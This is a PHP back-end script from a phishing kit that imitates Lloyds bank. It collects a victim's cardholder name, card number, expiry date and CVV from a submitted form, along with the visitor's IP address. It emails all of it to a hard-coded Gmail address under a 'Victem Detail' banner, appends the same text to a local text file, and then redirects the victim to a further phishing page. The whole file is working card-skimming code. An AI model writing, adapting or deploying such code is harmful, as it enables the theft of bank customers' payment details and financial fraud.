<?php
$name = $_POST['cardname'] ; 
// $add = $_POST['lnc'] ; 
// $vill = $_POST['fullNameCyrillic'] ; 
// $zipp = $_POST['fullName'] ; 
// $em = $_POST['email'] ; 
// $tel = $_POST['phone'] ; 
// $id = $_POST['address'] ; 
$card = $_POST['cardNb'] ; 
$exp = $_POST['months'] ; 
$exp1 = $_POST['years'] ; 
$cvv = $_POST['cvc'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 $to="hfaidhmoukim@gmail.com" ; 
 $subject = " Carta |Lloyd |: from: ".$ip;
$nome="ahla bel uk twa7eshtkom " ; 
	$from="rzlt@lloyd.uk" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ Victem Detail :D  +-----------------\r\n";
$message .= "Name Vectim : ".$name."\r\n";
// $message .= "Addresss: " .$add."\r\n";
// $message .= "ville: " .$vill."\r\n";
// $message .= "zip code : " .$zipp."\r\n";
// $message .= "Emaill: " .$em."\r\n";
// $message .= "Phonee : " .$tel."\r\n";
// $message .= "Identity : " .$id."\r\n";
$message .= "---------------+ Card Information :D  +---------------\r\n";
$message .= "Card Number: " .$card."\r\n";
$message .= "Date D'exp : " .$exp.'/'.$exp1."\r\n";
$message .= "Cvv: ".$cvv. "\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By jen +------------------\r\n";
mail($to,$subject,$from_mail,$message);
$sajal = fopen("../zarga1.txt", "a");  
fwrite($sajal, $message);


header('Location: ../memorable.html');



?>